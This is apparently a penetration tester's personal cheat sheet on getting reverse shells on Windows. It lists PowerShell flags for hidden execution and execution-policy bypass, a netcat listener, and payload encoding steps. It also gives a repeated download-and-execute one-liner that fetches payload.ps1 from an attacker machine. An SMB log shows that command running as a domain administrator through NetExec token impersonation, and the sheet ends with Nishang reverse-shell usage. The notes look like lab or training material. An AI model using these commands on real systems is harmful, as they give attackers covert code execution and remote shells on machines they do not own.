# Windows Shells

All things Windows shells

## Fundamentals

We can use [revshells](https://www.revshells.com/). We will default to using `PowerShell #1` and if that doesnt work we move to `PowerShell #2`, but fall back on  `PowerShell #3` if we encounter issues. Note, `PowerShell #3 (Base64)` actually uses `PowerShell #2`.

We can also utilize `rlwrap` with a couple options to durastically increase the stability and ease of use of our netcat shell.

```bash
rlwrap -crA nc -lvnp 9001
```

**Utility options:**

- `-nop` (no profile) prevents PowerShell from loading the user's profile script when the session starts in order to ensure that the PowerShell session starts with a default, predictable environment.
- `-w hidden` (window hidden) makes it so the PowerShell window is not shown to the user
- `-noni` (non-interactive) prevents the shell from inadvertently pausing during execution. This option is not necessary but useful just incase
- `-ep bypass` (execution policy bypass) is also not necessary as `IEX` can execute scripts regardless of execution policy, but should be added in case to ensure execution regardless of the environment.

**Execution options:**

- `-c` will execute the following PowerShell command script or block in quotes
- `-e` will execute base64 encoded `UTF-16LE` PowerShell command script or block

Use the following command to properly convert shellcode to `UTF-16LE` format before base64 encoding it

```bash
cat shell | iconv -t utf-16le | base64 -w 0
```

**Note:** Powercat has the advantage of providing an interactive shell to run interactive programs such as winPEAS or mimikatz


### Downloading & running the shell

**Note: the shell might be FUCKED so use [nishangs](https://github.com/samratashok/nishang) to add quality of life**

for transfer usually this works
`powershell -ep bypass -C iex(new-object net.webclient).downloadstring('http://192.168.176.128:8000/payload.ps1')`

add quotations if your adding it somewhere
`"powershell -ep bypass -C iex(new-object net.webclient).downloadstring('http://192.168.176.128:8000/payload.ps1')"`


```
kali@kali ~> nxc smb 192.168.176.129 -u fcastle -p 'Password1' -M impersonate -o TOKEN=0 EXEC="powershell -ep bypass -C iex(new-object net.webclient).downloadstring('http://192.168.176.128:8000/payload.ps1')"
SMB         192.168.176.129 445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:MARVEL.local) (signing:True) (SMBv1:False)
SMB         192.168.176.129 445    HYDRA-DC         [+] MARVEL.local\fcastle:Password1 (Pwn3d!)
IMPERSON... 192.168.176.129 445    HYDRA-DC         [*] Uploading Impersonate.exe
IMPERSON... 192.168.176.129 445    HYDRA-DC         [+] Impersonate binary successfully uploaded
IMPERSON... 192.168.176.129 445    HYDRA-DC         [*] Executing powershell -ep bypass -C iex(new-object net.webclient).downloadstring('http://192.168.176.128:8000/payload.ps1') as MARVEL/Administrator
IMPERSON... 192.168.176.129 445    HYDRA-DC         [+] Impersonate binary successfully deleted

```


```
"powershell -ep bypass -C iex(new-object net.webclient).downloadstring('http://192.168.176.128:8000/payload.ps1')"
```

### PowershellTCP


https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1


send this shell to the victim, import it then give it parameteres


```powershell
. .\Invoke-PowershellTcp.ps1
Invoke-PowerShellTcp -Reverse -IPAddress -Port
```

Another method to make it work as a one-liner would be to add this to the end of the script `Invoke-PowerShellTcp -Reverse -IPAddress -Port`

and then just run 

```
powershell -ep bypass . .\Invoke-PowershellTcp.ps1
```